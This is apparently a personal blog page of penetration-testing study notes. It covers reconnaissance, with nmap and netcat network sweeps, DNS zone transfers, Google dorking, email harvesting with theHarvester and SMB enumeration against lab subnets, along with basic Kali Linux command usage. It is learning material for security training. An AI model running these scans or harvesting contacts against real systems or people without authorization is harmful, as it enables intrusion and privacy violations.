<h2 id="Third-usage"><a href="#Third-usage" class="headerlink" title="Third usage:"></a>Third usage:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -A -p80 --open 10.11.1.0&#x2F;24 -oG nmap-scan_10.11.1.1-254</span><br><span class="line"></span><br><span class="line">cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v &quot;Nmap&quot; | awk &#39;&#123;print $2&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>awk use space as delimiter  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v &quot;Nmap&quot; | awk &#39;&#123;print $2&#125;&#39;); do cutycapt --url&#x3D;$ip --out&#x3D;$ip.png;done</span><br></pre></td></tr></table></figure>
<p>cutycapt render the webpage</p>
<h1 id="Passive-Information-Gathering"><a href="#Passive-Information-Gathering" class="headerlink" title="Passive Information Gathering"></a>Passive Information Gathering</h1><p>Passive Information Gathering (also known as Open-source Intelligence or OSINT)  </p>
<ul>
<li>never communicate with the target directly </li>
</ul>
<h2 id="Website-Recon"><a href="#Website-Recon" class="headerlink" title="Website Recon"></a>Website Recon</h2><p>simply browsing the site </p>
<h2 id="Whois-enueration"><a href="#Whois-enueration" class="headerlink" title="Whois enueration"></a>Whois enueration</h2><p>whois google.com, can also look for ns<br>reverse lookup:<br><code>whois &lt;ip&gt;</code>  </p>
<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p><code>site:domanname.com filetype:php </code><br><code>site:domanname.com -filetyle:html</code><br><code>intitle:&quot;index of&quot; &quot;parent directory&quot;</code><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a>  </p>
<h2 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h2><p><a target="_blank" rel="noopener" href="https://www.netcraft.com/">https://www.netcraft.com/</a><br><a target="_blank" rel="noopener" href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com</a>  </p>
<h2 id="Recon-NG"><a href="#Recon-NG" class="headerlink" title="Recon-NG"></a>Recon-NG</h2><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><h2 id="Security-headers"><a href="#Security-headers" class="headerlink" title="Security headers"></a>Security headers</h2><p><a target="_blank" rel="noopener" href="https://securityheaders.com/">https://securityheaders.com/</a>   </p>
<h2 id="SSL-server-test"><a href="#SSL-server-test" class="headerlink" title="SSL server test"></a>SSL server test</h2><p><a target="_blank" rel="noopener" href="https://www.ssllabs.com/ssltest/">https://www.ssllabs.com/ssltest/</a><br>analyze ssl configurations  </p>
<p><a target="_blank" rel="noopener" href="https://pastebin.com/">https://pastebin.com/</a>  </p>
<h2 id="User-information-gathering"><a href="#User-information-gathering" class="headerlink" title="User information gathering"></a>User information gathering</h2><h3 id="Email-Harvesting"><a href="#Email-Harvesting" class="headerlink" title="Email Harvesting"></a>Email Harvesting</h3><p><code>theHarvester -d hello.com -b google</code></p>
<p><a target="_blank" rel="noopener" href="https://www.social-searcher.com/">https://www.social-searcher.com</a><br><a target="_blank" rel="noopener" href="https://digi.ninja/projects/twofi.php">https://digi.ninja/projects/twofi.php</a><br><a target="_blank" rel="noopener" href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a>  </p>
<h2 id="StackOverflow"><a href="#StackOverflow" class="headerlink" title="StackOverflow?"></a>StackOverflow?</h2><h2 id="Some-frameworks"><a href="#Some-frameworks" class="headerlink" title="Some frameworks"></a>Some frameworks</h2><p>OSINT Framework <a target="_blank" rel="noopener" href="https://osintframework.com/">https://osintframework.com/</a><br>Maltego <a target="_blank" rel="noopener" href="https://www.paterva.com/buy/maltego-clients.php">https://www.paterva.com/buy/maltego-clients.php</a>  </p>
<h1 id="Active-Information-Gathering"><a href="#Active-Information-Gathering" class="headerlink" title="Active Information Gathering"></a>Active Information Gathering</h1><h2 id="DNS-Enumeration"><a href="#DNS-Enumeration" class="headerlink" title="DNS Enumeration"></a>DNS Enumeration</h2><p><code>host www.google.ca</code><br><code>host -t mx www.google.ca</code>  </p>
<h3 id="Forward-Lookup-bruteforce"><a href="#Forward-Lookup-bruteforce" class="headerlink" title="Forward Lookup bruteforce"></a>Forward Lookup bruteforce</h3><h3 id="Reverse-lookup-bruteforce"><a href="#Reverse-lookup-bruteforce" class="headerlink" title="Reverse lookup bruteforce"></a>Reverse lookup bruteforce</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(seq 50 100); do host x.x.x.$ip; done | grep -v &quot;not found&quot;</span><br></pre></td></tr></table></figure>

<h3 id="DNS-ZONETRANSFER"><a href="#DNS-ZONETRANSFER" class="headerlink" title="DNS ZONETRANSFER"></a>DNS ZONETRANSFER</h3><p><code>host -l</code><br><code>dnsrecon -d domain -D ~/list -t brt</code>  </p>
<h1 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h1><p><code>nc -nvv -w 1 -z 10.11.1.220 3388-3390</code><br>-w option specifies the connection timeout in seconds and -z is used to specify zero-I/O mode<br><code>nc -nv -u -z -w 1 10.11.1.115 160-162</code>  -u udp  </p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>-sT connection<br>-sU udp scan<br>-sS stealth/SYN scan  </p>
<h3 id="network-sweeping"><a href="#network-sweeping" class="headerlink" title="network sweeping"></a>network sweeping</h3><p><code>nmap -sn 10.11.1.1-254</code> -sn: Ping Scan - disable port scan<br><code>nmap -p 80 10.11.1.1-254 -oG web-sweep.txt</code><br><code>nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt</code>  </p>
<p>top ports determined here: <code>/usr/share/nmap/nmap-services</code> </p>
<p>-O OS fingerprint scan<br>-sV determine service and version info  </p>
<h3 id="Nmap-scripting-engine-NSE"><a href="#Nmap-scripting-engine-NSE" class="headerlink" title="Nmap scripting engine (NSE)"></a>Nmap scripting engine (NSE)</h3><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p>sudo apt install masscan</p>
<h1 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h1><p>port 139, 445<br><code>nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227</code><br><code>nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254</code><br><code>sudo nbtscan -r 10.11.1.0/24</code>  </p>
<h1 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h1><p>rpc-bind 107 </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/13/Study-Notes-2021-03-13/">Study Notes - 2021/03/13</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><p>Some reviews: </p>
<h1 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h1><p>/bin/<br>/sbin/  system programs<br>/etc/   files<br>/tmp/ temporay file delete on boot<br>/usr/bin/  user binary<br>/usr/share application support files  </p>
<h2 id="Linux-Commands"><a href="#Linux-Commands" class="headerlink" title="Linux Commands:"></a>Linux Commands:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man -k passwd:  key word search</span><br><span class="line">└─$ man -k &#39;^passwd$&#39;  </span><br><span class="line">passwd (1)           - change user password</span><br><span class="line">passwd (1ssl)        - compute password hashes</span><br><span class="line">passwd (5)           - the password file</span><br><span class="line">man 5 passwd</span><br></pre></td></tr></table></figure>

<p>apropos == man -k  </p>
<p>ls -a1<br>-1 means one file each line<br>cd, mkdir, pwd<br>with space:<br>cd module\ one/<br>mkdir -p /hello/world/{recon, exploit, report}  </p>
<h3 id="Finding-files-in-kali-linux"><a href="#Finding-files-in-kali-linux" class="headerlink" title="Finding files in kali linux"></a>Finding files in kali linux</h3><p>find, locate, which  </p>
<p><code>locate</code> seach a built in database instead of harddisk, can be update manually. <code>sudo updatedb</code>  </p>
<p>find can search size, type….</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find &#x2F; -name sbd*</span><br></pre></td></tr></table></figure>

<h2 id="manage-linux-services"><a href="#manage-linux-services" class="headerlink" title="manage linux services"></a>manage linux services</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo ss -antlp | grep sshd</span><br><span class="line">ss  is  used to dump socket statistics.</span><br></pre></td></tr></table></figure>
<p>-a all<br>-n numerical<br>-t tcp<br>-l listening<br>-p display process  </p>
<h3 id="list-all-available-services"><a href="#list-all-available-services" class="headerlink" title="list all available services:"></a>list all available services:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure>

<h2 id="Search-install-remove-tools"><a href="#Search-install-remove-tools" class="headerlink" title="Search/install/remove tools"></a>Search/install/remove tools</h2><p>sudo apt update<br>sudo apt upgrade &lt;package-name&gt;</p>
<p>apt-cache search pure-ftpd     search if package exist, search in package description<br>apt show &lt;pacage-name&gt;  show the description<br>apt install &lt;package-name&gt;<br>apt remove –purge  completely remove the package including user configurations  </p>
<p>sudo dpkg -i &lt;path to the package file.deb&gt;      will not install any dependency   </p>
<h1 id="Commandline"><a href="#Commandline" class="headerlink" title="Commandline"></a>Commandline</h1><h2 id="Some-environment-variables"><a href="#Some-environment-variables" class="headerlink" title="Some environment variables:"></a>Some environment variables:</h2><p>$PATH, $USER, $PWD, $HOME</p>
<h3 id="define-EV"><a href="#define-EV" class="headerlink" title="define EV:"></a>define EV:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export b&#x3D;10.11.1.220</span><br><span class="line">ping -c 2 $b</span><br></pre></td></tr></table></figure>
<p>without export, only affect current bash, not inherit by spawning bash  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure>

<h2 id="Bash-history"><a href="#Bash-history" class="headerlink" title="Bash history"></a>Bash history</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">!32   # replay line 32</span><br><span class="line">!!    # repeat the last command</span><br></pre></td></tr></table></figure>
<p>saved in <code>~/.bash_history</code><br><code>$HISTSIZE</code>,  <code>$HISTFILESIZE</code><br><code>CTRL+R</code> reverse-i-search  looking for most recent matched command  </p>
<h2 id="Pipline-and-redirection"><a href="#Pipline-and-redirection" class="headerlink" title="Pipline and redirection"></a>Pipline and redirection</h2><p>0 STDIN, 1 STDOUT, 2 STDERR  </p>
<p>Redirect to a new file:<br><code>echo &quot;test&quot; &gt; test.txt</code><br>Redirect to an existing file:<br><code>echo &quot;test&quot; &gt;&gt; test.txt</code><br>Redirect from a file:<br><code>wc -m &lt; test.text</code>  connect the file to the STDIN of wc<br>Redirect STDERR<br><code>ls ./test 2&gt;error.txt</code>  </p>
<h3 id="Piping"><a href="#Piping" class="headerlink" title="Piping"></a>Piping</h3><p><code>cat error.txt | wc -m</code>   output of cat to input of wc  </p>
<h2 id="Text-searching"><a href="#Text-searching" class="headerlink" title="Text searching"></a>Text searching</h2><p><code>ls -la /usr/bin | grep zip</code><br>-r recursive search<br>-i ignore case<br>sed:<br><code>echo &quot;I need to try hard&quot; | sed &#39;s/hard/harder/&#39;</code><br>cut:<br><code>echo &quot;hello, world, ???&quot; | cut -f 2 -d &quot;,&quot;</code><br>-f field<br>-d delimiter<br><strong>can only acce[t single char delimiter</strong><br><code>echo &quot;hello::there::friend&quot; | awk -F &quot;::&quot; &#39;&#123;print $1, $3&#125;&#39;</code><br>-F field separator  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat access.log | cut -d &quot; &quot; -f 1 | sort -u</span><br><span class="line">cat access.log | cut -d &quot; &quot; -f 1 | sort | uniq -c | sort -urn</span><br></pre></td></tr></table></figure>

<p>-n compare according to string numerical value<br>-r reverse the result of comparisons  </p>
<h1 id="Nano"><a href="#Nano" class="headerlink" title="Nano"></a>Nano</h1><p><code>Ctrl + K</code> cut the line<br><code>Ctrl + U</code> paste the line<br><code>Ctrl + W</code> search in the file  </p>
<h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p><code>dd</code> delete current line<br><code>yy</code> copy the current line<br><code>p</code> to paste the clipboard content<br><code>x</code> delete the char under the current cursor  </p>
<h1 id="File-comparison"><a href="#File-comparison" class="headerlink" title="File comparison"></a>File comparison</h1><p><code>comm file1 file2</code>  unique line in file1. file2, and in both file<br><code>comm -12 file1 file2</code>  supress col1,2, only display lines in both files<br><code>diff -c/-u</code><br><code>vimdiff</code>  <code>Ctrl + W + arrow</code> switch window<br><code>[/] + c</code> jump to prev/next change<br><code>d+o</code> get the change in other window and put to the current one<br><code>d+p</code> put the change in current window and put to the other one   </p>
<h1 id="Manage-processes"><a href="#Manage-processes" class="headerlink" title="Manage processes"></a>Manage processes</h1><h2 id="background-process"><a href="#background-process" class="headerlink" title="background process"></a>background process</h2><p><code>Ctrl + Z</code> to suspend it, then resume it using <code>bg</code>  </p>
<p><code>jobs</code> shows the jobs in the current terminal<br><code>fg %[jobnum]</code> return the job to the foreground  </p>
<p><code>ps -ef</code><br> -e, –everyone  show processes of all users<br> -f, –full      show process uids, ppids  </p>
<h1 id="File-and-Command-Monitoring"><a href="#File-and-Command-Monitoring" class="headerlink" title="File and Command Monitoring"></a>File and Command Monitoring</h1><p> <code>tail and watch</code><br> <code>watch</code>  run command every 2 second<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 5 w</span><br></pre></td></tr></table></figure><br>w - Show who is logged on and what they are doing.<br>-n   every 5 seconds  </p>
<h1 id="Download-Files"><a href="#Download-Files" class="headerlink" title="Download Files:"></a>Download Files:</h1><p><code>wget -O [dest] [url]</code><br><code>curl -o [dest] [url]</code><br><code>axwl -a -n 50 -o [dest] [url]</code><br>-n number of connections use<br>-a      Alternate progress indicator  </p>
<h1 id="Bash-environment"><a href="#Bash-environment" class="headerlink" title="Bash environment"></a>Bash environment</h1><p><code>export HISTCONTROL=ignoredups</code></p>
<p>System bash <code>/etc/bash.bashrc</code>  </p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>